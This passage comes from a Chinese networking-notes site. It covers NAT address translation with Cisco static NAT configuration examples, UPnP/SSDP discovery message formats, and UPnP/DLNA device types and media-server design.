当外部网络对内部主机进行应答时，数据包被送到NAT路由器上，路由器接收到目的地址为内部全局地址的数据包后， 它将用内部全局地址通过NAT映射表查找出内部局部地址，然后将数据包的目的地址替换成内部局部地址，并将数据包转发到内部主机。 其实主要就是 修改 IP 数据包中的源 IP 地址，或目的 IP 地址。 主要目的是把 RFC1918所提议的私有地址转变成在 Internet 上可路由的公有合法地址。 对于某些有限的应用（如 DNS、 FTP 等），它也可以修改 IP 数据包有效载荷中的地址。 由于应用的复杂性， NAT 目前支持的应用有限，当然，如果需要，完全可以针对新的应用做相应的开发工作。 总体来说，NAT进行地址转换的过程就是\"本地地址\"与\"全局地址\"之间的转换过程，无论数据包是从内部网络发往外部网络，还是从外部网络发往内部网络。 不同的只是本地地址和全局地址所对应的网络不同，以及数据包重新封装的源和目的地址不同。具体如图所示。 NAT基本地址转换原理 这个过程是通过NAT中的本地址与全局地址映射条目来实现的，所以事先要在NAT路由器上配置这样的映射条目。 NAT中的转换方式 从内网中设备上发出的IP包是以\"inside local address\"作为源地址，以\"outside local address\"作为目的地址。 当数据包到达NAT设备的\"inside\"接口后，地址分别被翻译成\"inside global address\"和\"outside global address\"并从\"outside\"接口送出。 外网设备上发出的IP包以\"outside global address\"作为源地址，以\"inside global address\"作为目的地址。 当数据包到达NAT设备的\"outside\"接口后，地址分别被翻译成\"outside local address\"和\"inside local address\"并从\"inside\"接口送出。 当内部网络用户访问外部网络时，所进行的是\"内部本地地址\"和\"内部全局地址\"之间的转换。 在NAT路由器接收到来自内部网络主机发送的数据包时，其源IP地址（SA）为\"内部本地地址\"，目的IP地址（DA）为\"外部本地地址\"。 当数据包被转发到外部网络时，数据包的源IP地址（SA）就会转变为\"内部全局地址\"，而目的IP地址（DA）被转变为\"外部全局地址\"。 也就是把数据包的所有源IP地址（SA）和目的IP地址（DA）全部由本地地址转换为全局地址。如图6-9上部分数据包IP地址转换示意图。 相反，当外部网络用户访问内部网络时，所进行的是\"外部本地地址\"和\"外部全局地址\"之间的转换。 在NAT路由器接收到来自外部网络主机发送的数据包时，其源IP地址（SA）就是\"外部全局地址\"，目的IP地址（DA）就是\"内部全局地址\"。 相当于由内部网络向外部网络发送数据包时数据包中的源IP地址（SA）和目的IP地址（DA）的互换。 而当数据包被路由器转发到本地网络时，源IP地址（SA）被转变为\"外部本地地址\"，目的IP地址（DA）被转变为\"内部本地地址\"， 也相当于由内部网络向外部网络发送数据包时数据包中的源IP地址（SA）和目的IP地址（DA）的互换。如图6-9下部分数据包IP地址转换示意图 NAT基本IP地址转换原理 以上是从总体上介绍NAT的IP地址转换原理的，实际NAT应用有时并不需要对源IP地址和IP地址进行全面替换， 仅需要对源IP地址或者仅需要对目的IP地址进行转换即可达到所需的目的。 下面予以介绍。 内部地址NAT转换原理 多数情况下使用NAT的目的就是为了使内部网络中的多个用户能使用一个注册IP地址访问外部网络，所以仅需要配置内部地址NAT转换。 即通过ip nat inside source命令实现\"内部本地地址\"到\"内部全局地址\"之间的转换（既可以采用静态NAT方式实现，也可以采取动态NAT方式实现）， 只需要定义内部本地址与内部本局地址的映射。 一个简单的NAT转换示例 这是一个简单的NAT转换示例。要实现以下目的：当NAT路由器的内部网络s0接口上接收到一个源地址为内部本地地址10.10.10.1， 目的IP地址为外部本地地址171.16.68.1的数据包时，在转发到s1接口时，原来数据包源地址的内部本地地址10.10.10.1被转换成内部全局地址171.16.68.5， 但目的地址不变，然后继续发送。在这个过程中，所进行的只是数据包中源IP地址的转换，由内部本地地址向内部全局地址转换，且只是内部地址之间的转换。 相反，当在NAT路由器的外部网络接口s1上接收源地址为172.16.68.1外部本地地址， 目的地址为内部全局地址172.16.68.5的外部服务器响应数据包时，目的地址将被转换成10.10.10.1这个内部本地地址，然后继续发送。 在这个过程中，所进行的只是数据包中目的IP地址的转换，由内部全局地址向内部本地地址转换，也只是内部地址之间的转换。 下面仅以静态NAT转换方式为例介绍内部地址转换的配置步骤，详细的NAT配置方法将在本章后面具体介绍。 （1）使用\"ip nat inside source static\"全局配置命令启用基于内部源IP地址的静态NAT IP地址转换。 也就是定义内部本地地址和内部全局地址，使它们之间形成一一对应的映射关系: Router(config)#ip nat inside source static 10.10.10.1 171.16.68.5 !--- 在内部本地地址10.10.10.1与内部全局地址171.16.68.5之间建立静态NAT映射关系，使内部网络主机知道要以171.16.68.5这个地址到达外部网络主机 （2）使用以下两条语句配置路由器的s0为NAT的内部网络接口: Router(config)#interface s0 !--- 进入s0串口配置模式 Router(config-if)#ip nat inside !--- 把s0串口指定为内部网络接口 （3）使用以下两条语句配置路由器的s1为NAT的外部网络接口: Router(config)#interface s1 !--- 进入s1串口配置模式 Router(config-if)#ip nat outside !--- 把s1串口指定为外部网络接口 （4）使用show ip nat translations特权模式命令验证上述进行的路由器NAT配置。 输出信息中显示以上配置的NAT条目配置为：内部本地地址为10.10.10.1，内部全局地址为171.16.68.5。 这与上面的配置是一致的，证明配置是成功的: Router#show ip nat translations !--- 在特权模式下显示当前路由器NAT配置 Pro Inside global Inside local Outside local Outside global --- 171.16.68.5 10.10.10.1 --- --- 此时如果对外部网络目的主机进行ping操作，就会有数据包从内部网络转发到外部网络。 然后再在路由器特权模式下执行\"show ip nat translations\"命令，显示的NAT信息如下。 多了一条icmp协议类型数据包（执行ping操作后加的）显示，但因为此时没有配置外部网络的本地地址和全局地址， 所以显示的外部本地地址和外部全局地址都是一样的，都是ping操作目的主机地址171.16.68.1: Router#show ip nat translations Pro Inside global Inside local Outside local Outside global icmp 171.16.68.5:15 10.10.10.1:15 171.16.68.1:15 171.16.68.1:15 --- 171.16.68.5 10.10.10.1 --- --- 通过以上配置后，从内部网络发往外部网络的数据包只是源地址（SA）将 在经过路由器后进行转换（由内部本地地址10.10.10.1转换成内部全局地址171.16.68.5），但目标地址（DA）不变， 但从外部网络发往内部网络的应答数据包的源地址没有改变， 只是经过路由器后的数据包目的地址发生了转换（由内部全局地址172.16.68.5转换成内部本地地址10.10.10.1）， 但源地址（SA）不变。因为此时还没有为NAT路由器配置外部网络的本地地址和全局地址转换。 此时，数据包在内、外部网络中的源地址、目的地址的转换方式参如图 在内部地址的NAT转换中，无论数据包来自哪里，数据包中地址变化的只是内部地址之间的转换。 但要注意，地址变化所对应的是源地址，还是目的地址是要看数据包是来自内部网络， 还是来自外部网络：如果是来自内部网络，转换是源地址；如果是来自外部网络，转换的是目的地址。 外部地址NAT转换原理 当公司服务器位于内部网络，使用内部网络私有IP地址，为了方便外部网络用户对内部网络服务器进行访问， 则需要使用ip nat outside source命令配置\"外部全局地址\"与\"外部本地地址\"之间 的转换（既可以采用静态NAT方式实现，也可以采取动态NAT方式实现）。 外部地址NAT转换与上节介绍的内部地址NAT转换是相反的，它仅需要定义外部地址（包括外部本地地址和外部全局地址）。 下面同样以上面那个简单的NAT转换示例进行介绍。 本示例要实现的目的是： 当NAT路由器外部网络接口s1接收到来自外部网络用户发送的源IP地址为外部全局地址171.16.68.1， 目的地址为外部本地地址10.10.10.1的数据包在被路由器转发到s0接口时， 数据包中的源IP地址转变为外部本地地址10.10.10.5（即由外部全局地址转换成外部本地地址）， 目的IP地址不变，即也只是源IP地址的转换；而由内部网络用户发送的响应数据包中， 却只是目的IP地址（即由外部本地地址转换为外部全局地址）的转换，源IP地址不变。 下面仅以静态NAT转换方式为例介绍外部地址NAT转换的配置步骤，详细的NAT配置方法将在本章后面具体介绍。 （1）使用ip nat outside source static全局配置命令启用基于外部源IP地址的静态NAT IP地址转换。 也就是定义外部全局地址和外部本地地址之间的映射关系: Router(config)#ip nat outside source static 171.16.68.1 10.10.10.5 !--- 在外部全局地址171.16.68.1与外部本地地址10.10.10.5之间建立静态NAT转换关系，使外部网络主机知道要以10.10.10.1这个地址到达内部网络主机 （2）使用以下两条语句配置路由器的s0作为NAT的内部网络接口: Router(config)#interface s0 Router(config-if)#ip nat inside （3）使用以下两条语句配置路由器的s1作为NAT的外部网络接口: Router(config)#interface s1 Router(config-if)#ip nat outside 注解 对于特定的NAT网络来说，路由器上的内、外部网络接口是固定的，不会随着通信方向的改变而改变。 如在上节介绍的内部地址的NAT转换示例中，我们同样是把s0接口作为内部网络接口，s1接口作为外部网络接口。 （4）使用show ip nat translations特权模式命令验证上述进行的路由器NAT配置。 从中可以看出，此时NAT的外部本地地址为10.10.10.5，外部全局地址为171.16.68.1。这与上面的配置是一致的，证明配置是成功的: Router#show ip nat translations Pro Inside global Inside local Outside local Outside global --- --- --- 10.10.10.5 171.16.68.1 同样，如果此时执行一个从外部网络主机（171.16.68.1）到内部网络主机（10.10.10.1）的ping操作， 然后再在路由器特权模式下执行\"show ip nat translations\"命令，则显示如下结果。 因为此时仅配置了外部本地地址和外部全局地址，所以结果中显示的内部本地地址和全局地址都是一样的，都是ping操作目的主机地址10.10.10.1: Router#show ip nat translations Pro Inside global Inside local Outside local Outside global --- --- --- 10.10.10.5 171.16.68.1 icmp 10.10.10.1:37 10.10.10.1:37 10.10.10.5:37 171.16.68.1:37 与上节介绍的仅配置内部地址相反，此处从外部网络发往内部网络的数据包的源IP地址（SA）将 在经过路由器后进行转换（由外部全局地址171.16.68.1转换成外部本地地址10.10.10.5），但目标地址（DA）不变； 但从内部网络发往外部网络的响应数据包的源IP地址没有改变， 只是经过路由器后的数据目的IP地址发生了改变（由外部本地地址10.10.10.5转换成外部全局地址171.16.68.1）。 因为此时还没有为NAT路由器配置内部本地地址和内部全局地址转换。此时，数据包在内、外部网络中的源IP地址、目的IP地址的转换方式如图6-12所示。 【经验之谈】在仅进行外部地址NAT转换时，无论数据包来自哪里，数据包中地址变化的只是外部地址之间的转换。 同样也需注意，地址变化所对应的是源IP地址，还是目的IP地址是要看数据包是来自内部网络， 还是来自外部网络：如果来自内部网络，转换是目的IP地址； 如果来自外部网络，转换的是源IP地址。这与前面的内部地址NAT转换是对应相反的。","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-NAT-mode-in-the-network.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-NAT-mode-in-the-network.html"},{"title":"网络常识","text":"因为没主攻过这个方向, 所以很多东西了解的算模模糊糊. 在此处对一些知识做一个记录. web服务启动在0.0.0.0与启动在本机ip的区别 举例说明, 若本地ip为 192.168.1.12, 然后运行了一个web服务, 若只绑定到 127.0.0.1: 8080: 只能 127.0.0.1: 8080 本地访问 若将服务绑定到 192.168.1.12:8080: 可以从 127.0.0.1:8080 本地访问 可以从 192.168.1.12:8080 访问(支持本地与局域网内同网段机器访问) 若将服务绑定到 0.0.0.0: 8080: 上面的 192.168.1.12 与 127 都可以访问 还可以通过本机 公网ip:8080 访问 区别就是 0.0.0.0 是一个特殊的 IP 地址, 表示会监听本机所有网络接口 , 比如本机配置了多个ip的时候, 或者想同时运行在本地与公网的时候, 就很有用. 只是本机测, 跑个127就行了. 网段/IP 一般一个网段子网内, 以192.168.2.0 举例, 192.168.2.0 表示这个网段 (是一个网络地址而非主机地址) 192.168.2.1 表示此网段的网关 192.168.2.255 表示广播地址","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-Network-common-sense.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-Network-common-sense.html"},{"title":"upnp流程详细介绍","text":"大体上是以下流程 地址分配 UPnP 设备加入网络后,通过自动配置或动态主机配置协议(DHCP)获得一个 IP 地址。 对于在个人pc上自行开发而言, 一般这一步在第一次启动电脑的时候已经做了. 发现 UPnP 设备通过简单服务发现协议(SSDP)广播自己的存在,并侦听其他设备的广播。发现过程中交换设备的唯一标识符、URL 等信息。 使用 UDP 协议. UPnP设备发现过程中的所有UDP消息都使用以下格式: METHOD * HTTP/1.1 HOST: 239.255.255.250:1900 [其他头部] METHOD指明消息类型,可以是NOTIFY、M-SEARCH等 * 表示发送到所有设备 HOST指定目的地址是SSDP的组播地址和端口1900 其他头部根据消息类型不同而不同 ssdp:alive 通告消息 当设备第一次加入网络或需要更新过期时间时,会主动发送ssdp:alive通告消息. 向网络告知设备加入 - NOTIFY: NOTIFY * HTTP/1.1 HOST: 239.255.255.250:1900 CACHE-CONTROL: max-age=1800 LOCATION: http://192.168.1.20:5678/device.xml NT: upnp:rootdevice NTS: ssdp:alive USN: uuid:f40c2981-7329-40b7-8b04-27f187aecfb5 其中: NOTIFY: 一个通告消息 HOST: 目的地址是SSDP组播地址,端口号1900 CACHE-CONTROL: 指定通告消息的过期时间1800秒 LOCATION: 提供设备描述文档的URL NT: 描述设备类型,这里是upnp:rootdevice表示根设备 USN: 提供设备的UUID M-SEARCH搜索消息 设备搜索, 当控制点加入网络或需要发现设备时,会发送M-SEARCH搜索消息: M-SEARCH * HTTP/1.1 HOST: 239.255.255.250:1900 MAN: ssdp:discover MX: 3 ST: ssdp:all MX：设置设备响应最长等待时间，设备响应在0和这个值之间随机选择响应延迟的值 ST：设置服务查询的目标，它必须是下面的类型： ssdp:all 搜索所有设备和服务 upnp:rootdevice 仅搜索网络中的根设备 uuid:device-UUID 查询UUID标识的设备 urn:schemas-upnp-org:device:device-type :{version} 查询device-Type字段 指定的设备类型，设备类型和版本由UPNP组织定义 urn:schemas-upnp-org:service:service-type :{version} 查询service-Type字段 指定的服务类型，服务类型和版本由UPNP组织定义 搜索网络上的所有设备。设备需在3秒内返回响应。 ssdp:response 响应消息 当设备接收到 M-SEARCH搜索消息 后,需要返回ssdp:response响应消息。例如: HTTP/1.1 200 OK CACHE-CONTROL: max-age=1800 DATE: Fri, 15 Jun 2018 04:56:29 GMT EXT: LOCATION: http://192.168.1.20:5678/device.xml SERVER: Linux/3.14.0 UPnP/1.1 XXX-Device/1.0 ST: upnp:rootdevice USN: uuid:f40c2981-7329-40b7-8b04-27f187aecfb5 EXT: 留作扩展使用的头部。目前未使用。 ST: 搜索目标(Search Target)字段,返回搜索的设备类型。这里是upnp:rootdevice表示根设备。 SERVER: 服务器字段,提供响应设备的操作系统、UPnP协议版本和设备信息。格式不严格指定,由设备厂商自定义。 ssdp:byebye退出消息 当UPnP设备从网络移除时,它需要发送ssdp:byebye消息以通知网络上的其他设备: NOTIFY * HTTP/1.1 HOST: 239.255.255.250:1900 NT: upnp:rootdevice USN: uuid:device-UUID NOTIFY方法表示这是一条通告消息 收到此ssdp:byebye消息的其他设备,将删除对应设备信息,知晓该设备已不再存在于网络中。 UPnP设备需要在从网络断开时发送ssdp:byebye消息,而不能仅仅断开网络连接就离开。 否则,其他设备会一直认为它存在,直到其ssdp:alive消息过期。ssdp:byebye消息能更清晰的告知设备的离开,避免其他设备的错误认知。 描述 每个 UPnP 设备都有一个 XML 设备描述文件和一个或多个服务描述文件,描述设备和服务的详细信息。这些描述文件根据 UPnP 设备架构制定。 控制 UPnP 使用简单对象访问协议(SOAP)实现设备的远程控制和查询。 事件通知 UPnP 使用通用事件通知架构(GENA)使设备能主动通知控制点其内部状态的变化。","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Detailed-introduction.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Detailed-introduction.html"},{"title":"设备/服务类型","text":"UPnP具有的Server类型 UPnP 定义了多种设备和服务类型,对应不同的功能和用途。其中 UPnP 设备类型由 UPnP 论坛定义和维护,常见的有: 1. 媒体服务器(MediaServer) 提供数字媒体内容存储和流式传输功能,如音乐、视频和图片。例如 Windows Media Player 可以发现这类设备并播放其媒体。 2. 媒体渲染器(MediaRenderer) 用于渲染数字媒体内容,如播放音乐、视频和显示图片。例如网络音响、网络电视和数字媒体播放器。 3. 网关设备(InternetGatewayDevice) 提供路由和互联网访问服务。大多数家用路由器实现此设备类型。 4. 打印机(Printer) 提供打印服务,允许网络计算机发现并使用连接的打印机。 5. 扫描仪(Scanner) 提供扫描服务,允许网络计算机控制扫描仪扫描文档。 6. 健康设备(HealthDevice) 提供健康和医疗设备相关的服务,用于远程监控。 7. 家庭自动化(HomeAutomation) 提供家居自动化设备控制,如灯光、电视等。智能家居产品常实现此类型。 8. 广告设备(Advertisement) 提供广告相关的服务,可以将广告信息推送到订阅客户端。 UPnP 设备会在自己的设备描述中声明具体实现的设备类型,这样 UPnP 控制点根据设备类型就可以判断设备提供的服务类型和功能。 其中媒体和路由器设备可能是最常见的类型。 具体的ID定义 在 UPnP 中,每个设备类型都对应一个标准的 server type 编号,也称 UPnP Device Type IDs。 这些编号由 UPnP 论坛定义和维护,以标识不同类型的 UPnP 设备。 常见的几种 UPnP 设备类型及其 server type ID 如下: 媒体服务器(MediaServer): urn:schemas-upnp-org:device:MediaServer:1 媒体渲染器(MediaRenderer): urn:schemas-upnp-org:device:MediaRenderer:1 路由器(InternetGatewayDevice): urn:schemas-upnp-org:device:InternetGatewayDevice:1 打印机(Printer): urn:schemas-upnp-org:device:Printer:1 扫描仪(Scanner): urn:schemas-upnp-org:device:Scanner:1 家庭自动化(HomeAutomation): urn:schemas-upnp-org:device:HomeAutomation:1 广告设备(Advertisement): urn:schemas-upnp-org:device:Advertisement:1 等等,每个设备类型都有自己唯一的 server type ID 进行标识。 UPnP 设备在其设备描述中,通过包含自己对应的标准 server type ID,来告知控制点自己具体实现的是哪种设备类型。 例如,如果一个 UPnP 设备的设备描述中包含: <deviceType>urn:schemas-upnp-org:device:MediaServer:1</deviceType> 则该设备实现的是 UPnP 媒体服务器设备类型。 UPnP 控制点可以通过解析设备描述,获取其中的 deviceType 信息,进而确定设备类型和支持的服务。 所以,UPnP Device Type ID 允许在标准的 UPnP 框架下,定义和识别各种服务器设备类型,这为 UPnP 设备之间的互操作性提供了基础。 开发 UPnP 设备时,需要选择一个已有的标准设备类型,或者定义一个新的设备类型(并申请一个唯一 ID),以便其他 UPnP 控制点能够正确识别该设备。 UPnP常见几种服务 AVTransport Service （可控制多屏设备上的媒体 play，pause，seek，stop 等） RenderingControl Service （可调节多屏设备上的音量，声音，静音等） ContentDirectory Service （可获取多屏设备上可访问的媒体内容） ConnectionManager Service （可提供所支持的传输协议信息及多屏设备的 MIME 格式信息） DLNA 各种设备术语 Digital Media Controller（DMC）数位媒体控制器： 作为遥控装置使用，可寻找 DMS 上的多媒体档案， 并指定可播放该多媒体档案的 DMR 进行播放或是控制多媒体档案上下传到 DMS 的装置，一般是手机。 Digital Media Server（DMS）数位媒体服务器： 提供了媒体档案的获取、录制、储存以及作为源头的装置。一般是公网上流媒体服务器 Digital Media Renderer（DMR）数位媒体控制器： 可接收并播放从 DMC push 过来的媒体档案。即接收投屏数据，一般是智能电视，OTT 盒子等。 这三者的关系是，DMC 通过获取 DMS 上的歌曲或者视频（也可以不是 DMS 上的，而仅仅只是一个链接），把它们传送到 DMR 上，由 DMR 进行播放。","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Equipment-·-Service-Type.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Equipment-·-Service-Type.html"},{"title":"自己实现DLNA媒体服务器","text":"实现一个完备的媒体服务器, 需要的设备服务分类 MediaServer设备: 提供资源发现和访问 必选服务:MediaServer , 媒体服务器服务, 提供媒体资源发现和元数据访问 公开服务器上的媒体资源,客户端可以浏览和搜索资源 客户端选择资源后,获取资源的详细信息(元数据)和流URL 必选服务:ContentDirectory , 内容目录服务 - 将存储在UPnP媒体服务器上的资源以树形结构组织起来方便浏览 - 支持根据资源类型(容器、对象)或元数据属性对资源进行过滤和搜索 - 允许控制点检索存储在服务中的资源的详细信息 可选服务:ConnectionManager, 连接管理器服务, 管理对服务器的连接,验证和授权客户端。可选服务. 若提供敏感数据或服务,需要对访问进行控制, 推荐实现 MediaRenderer设备: 获取流播放 必选服务:MediaRenderer,AVTransport 可选服务:ConnectionManager,MediaServer 其中: 媒体渲染器服务(MediaRenderer):获取和解码播放流媒体 接收客户端指定的流URL,从URL中获取媒体流 解码并播放收到的媒体流,实现远程流媒体播放 AV传输服务(AVTransport):控制MediaRenderer的播放 用于控制MediaRenderer的播放,实现播放控制(播放/暂停/停止/Seek等) 发布播放状态和进度等,供客户端监控 连接管理器服务(ConnectionManager):管理对渲染器的连接,可选服务 用于管理客户端与媒体服务器/渲染器的连接 验证客户端,授权流连接,并在连接断开时清理资源 提供流媒体播放服务, 若需要对连接和 Play 进行控制, 则推荐实现 媒体服务器服务(MediaServer):可选服务,如果MediaRenderer也存储资源可以实现。 如果一个设备同时具备资源存储+流媒体播放的功能,也可以选择只实现MediaRenderer设备, 并在其中同时包含MediaServer与MediaRenderer服务。但这需要MediaRenderer标准能够满足对应要求 具体可以通过以下设备描述将其定义为一个MediaServer+MediaRenderer设备: <root xmlns=\"urn:schemas-upnp-org:device-1-0\"> <specVersion> <major>1</major> <minor>0</minor> </specVersion> <device> <deviceType>urn:schemas-upnp-org:device:MediaServer:1</deviceType> <friendlyName>MY MEDIA SERVER</friendlyName> ... </device> <device> <deviceType>urn:schemas-upnp-org:device:MediaRenderer:1</deviceType> <friendlyName>MY MEDIA RENDERER</friendlyName> ... </device> </root> 该描述, 定义了一个带MediaServer和MediaRenderer设备类型的UPnP设备。从而在一个物理设备上提供完整的远程媒体浏览、播放和控制功能。 最小化存储媒体服务器 仅实现一个具有存储功能的设备服务, 类似于纯文件服务器, 媒体播放方面如解码/编码等由客户端自己实现. 可行方案: 使用设备: MediaServer ContentDirectory:提供文件存储目录和文件元数据的访问 ConnectionManager:管理客户端连接 这时候客户端需要实现 MediaRenderer:获取文件数据,解码并播放 AVTransport:自己实现播放控制 ConnectionManager:管理连接服务器获取文件 工作流程为: 客户端通过ContentDirectory浏览文件服务器上的文件,获取文件元数据 客户端选择文件后,通过ConnectionManager与文件服务器建立连接,获取文件数据 客户端自身具备解码和播放文件的能力,使用自己的MediaRenderer和AVTransport实现文件播放 客户端可以控制自己的播放,无需依赖服务器 这种方案的优点是: 文件服务器实现简单,只需提供文件存储和访问 客户端有更大的灵活性,可以选择任意的解码和播放方案 兼容性好,任何能够获取文件并播放的客户端都可以访问 缺点是: 客户端需要自行实现较复杂的流媒体播放功能 播放体验依赖客户端,无法统一 无法利用UPnP等标准来简化开发和提高互操作性 如果文件服务器只提供文件存储功能,依赖客户端实现播放,这种方案是可行的,可以获得较好的兼容性和灵活性。 但客户端开发会较为复杂,无法利用UPnP等标准来简化流程。 如果想进一步利用UPnP标准,可以考虑文件服务器实现: 设备类型:MediaServer+MediaRenderer 对应服务: - ContentDirectory - ConnectionManager - MediaRenderer - AVTransport 这样文件服务器可以直接对获取的文件解码和播放,并使用标准的AVTransport实现播放控制,这可以最大限度简化客户端开发,利用UPnP标准提高互操作性。同时也控制了播放体验,这是一种更佳的实现方案。 但是这样客户端只能进行项目浏览(看有哪些文件/文件夹), 不能访问具体的媒体数据(不能媒体传输播放视频). 若需要支持数据传输, 还需要实现: MediaRenderer 服务, 使用下面的 GetMediaInfo action来获取媒体数据. GetMediaInfo Action的输入输出参数如下: 输入参数: InstanceID: 媒体实例ID,由Browse等Action返回 Filter: 指定返回的数据类型,如:\"*\"返回所有信息 输出参数: CurrentSrc: 媒体URL,指向实际的媒体文件 MetaInfo: 媒体元数据信息 Data: 实际的媒体文件数据,二进制 对应的参数类型为: InstanceID: string Filter: string CurrentSrc: string,url MetaInfo: string,xml Data: bin.base64 典型的调用流程为: 客户端调用ContentDirectory的BrowseAction获取要播放的媒体InstanceID 使用InstanceID调用GetMediaInfo Action,同时指定Filter为\"*\",表示返回所有信息 服务器返回CurrentSrc(媒体URL)、MetaInfo(元数据)和Data(文件数据) 客户端获取Data,调用系统API进行解码和播放 客户端可以使用Seek, Pause等Action控制播放 当客户端要主动获取服务器上的媒体文件并自行播放时,GetMediaInfo这个Action是最关键的。 它可以返回媒体的URL,元数据和文件数据,让客户端获得全部所需信息进行播放。","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-media-server-by-yourself.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-media-server-by-yourself.html"},{"title":"自己实现DLNA相关","text":"前景 去年买了个投影仪, 奈何想看高分辨率视频还得另外开会员, 最初是网上资源下载到硬盘, 然后用来两种方式: 在电脑开启samba协议, 投影仪访问samba共享库 把硬盘插投影仪播放 前者对于很大的视频而言, 卡; 后者插个小尾巴, 影响观感, 且不方便. 于是, 多方查询后选择了使用 DLNA 协议来解决(投影仪本身也支持), 又因为Windows自带的很垃圾, 时能用, 时不能用, 重装系统后干脆完全不能用了. 先提前解释一些概念 多播地址 多播地址允许在 UDP 层一次性将数据包发送给多台主机,任意主机都可以自动加入和离开多播组,这使其非常适合用于点对多点的应用, 如视频会议、游戏等。 UPnP 就采用标准的多播地址 239.255.255.250,实现在局域网中设备服务的自动发现,这也是 UPnP 协议的一大优点。 UPnP UPnP 采用标准的 多播地址 239.255.255.250, 实现在局域网中设备服务的自动发现 大致流程如下: 路由器/当前网络/当前设备支持 UPnP 当有新的 UPnP 设备加入网络或者发送搜索请求,该设备会向 239.255.255.250:1900 发送生存通告或搜索响应 (来表示自己是一个 UPnP 设备) 同时, UPnP 控制点设备也会使用 UDP 发送搜索请求到 239.255.255.250:1900,发现网络中的 UPnP 设备。 简单来说: UPnP 设备使用 239.255.255.250:1900 主动发送生存通告,以发布自己。 UPnP 控制点使用 239.255.255.250:1900 发送搜索请求,以发现 UPnP 设备。 UPnP 设备收到搜索请求后,会响应到请求来源(控制点),向其发送设备描述等信息。 然后控制点和设备之间可以建立直接的 TCP 连接,用于设备控制、事件通知等。 注解 UPnP 设备: 每个 UPnP 设备 都可视作一个单独的服务端, 提供服务; 需要遵循 UPnP 设备架构,提供设备描述、服务描述等, 如媒体服务器、路由器等。 UPnP 控制点: 可视作 UPnP 客户端, 访问和控制服务; 需要遵循 UPnP 控制点架构,知道如何发现设备、查询服务并控制, 如 Windows Media Player。 这就是 UPnP 中使用 UDP 多播在局域网中实现设备发现的基本过程。 每个 UPnP 设备和控制点都需要支持这个标准的多播地址和端口(都需要绑定到标准的多播地址 239.255.255.250 和端口 1900 上,), 才能实现互相发现和交互。 通过这种基于 UDP 多播的方式,UPnP 设备和控制点不需要事先知道彼此的 IP 地址,就可以实现自动发现与使用,这也是 UPnP 协议的一大优点。 UPnP 的主要功能包括: 设备发现:UPnP 设备可以动态加入和离开网络,并通过 UPnP 发现协议被自动检测。 设备控制:UPnP 设备可以通过控制协议远程控制和查询。 事件通知:UPnP 设备可以异步通知控制点有关设备状态的改变。 服务描述:UPnP 设备包含 XML 设备和服务描述,用于将设备功能及接口公开给控制点。 基本架构:UPnP 协议基于开放互联网基础设施工作组(Open InterConnect Consortium)制定的架构。 UPnP 主要由以下几个协议组成: 发现协议(SSDP):处理新设备的加入和离开。 设备和服务描述协议(XML):描述设备和服务的功能及接口。 控制协议(SOAP):提供设备远程控制和查询的机制。 事件通知协议(GENA):提供设备主动通知控制点状态变化的机制。 UPnP 已广泛应用于家庭自动化、互联网接入服务等领域。主流的 UPnP 设备和控制点有 Windows 系列操作系统、各种路由器、媒体中心等。 详细点的工作机制说明: UPnP 的工作机制主要包括:地址分配、发现、描述、控制和事件通知五部分。 地址分配:UPnP 设备加入网络后,通过自动配置或动态主机配置协议(DHCP)获得一个 IP 地址。 发现:UPnP 设备通过简单服务发现协议(SSDP)广播自己的存在,并侦听其他设备的广播。发现过程中交换设备的唯一标识符、URL 等信息。 描述:每个 UPnP 设备都有一个 XML 设备描述文件和一个或多个服务描述文件,描述设备和服务的详细信息。这些描述文件根据 UPnP 设备架构制定。 控制:UPnP 使用简单对象访问协议(SOAP)实现设备的远程控制和查询。 事件通知:UPnP 使用通用事件通知架构(GENA)使设备能主动通知控制点其内部状态的变化。 UPnP 已广泛应用于各种智能家居和互联网接入设备。 在 Windows 系统、各种路由器、NAS 存储设备中都采用了 UPnP 技术。 UPnP 简单易用,跨平台和互operability,已成为智能家庭网络联接的重要基石。 Windows开关流媒体支持 暂时只介绍最简单的 打开: 打开Windows Media Player, 点击流媒体, 根据提示打开 关闭: 去网络共享中心重制当前网络设置(没有直接关闭窗口) 参考 源代码分析及 DLNA 和 UPnP 协议理解 UPnP基本原理以及在NAT中的应用 alljoyn物联网 (这个没啥看的) UPnP协议编程实践 (这个缺少图片) 更新一下 上面的文档忘了是啥了, 重搜了一下 https://www.cnblogs.com/lcw/p/3416730.html https://blog.csdn.net/maimang1001/article/details/122970389 这个有图片展示 https://blog.csdn.net/weixin_41010318/article/details/78836718","tags":"计算机网络","url":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-related-by-yourself.html","loc":"/yq-doc-source-docs-Chaotic-computer-network-UPNP-protocol-Implement-DLNA-related-by-yourself.html"},{"title":"upnp部分字段/术语介绍","text":"UUID UUID含义是通用唯一识别码（Universally Unique Identifier）， 其目的是让分布式系统中的所有元素都有唯一的标识，其格式为xxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx（8-4-4-16）， 分别表示当前的日期、时间、始终序列、全局唯一的IEEE机器标识，如果有网卡，则从网络的MAC地址获取，没有网卡则以其他方式获得。 UDN 单一设备名字（Unique Device Name），基于UUID，表示一个设备，在不同的时间，对于同一台设备此值应该是唯一的。 URI Web上可用的每种资源，包括HTML文档、图像、视频片段、程序等，由一个通用资源标志符（Universal Resource Identifier，简称\"URI\"）进行定位。URI一般有三部分组成：访问资源的命名机制、存在资源的主机名、资源自身的名称，由路径表示。考虑下面的URI，它表示了当前的HTML 4.0规范； http://www.webmonkey.com.cn/html/html40 /它表示一个可通过HTTP协议访问的资源，位于主机www.webmonkey.com.cn上，通过路径\"/html/html40\"访问 URL URL是URI命名机制的一个子集，URL是Uniform Resource Location的缩写，译为\"统一资源定位符\"。 形象点说，URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上， 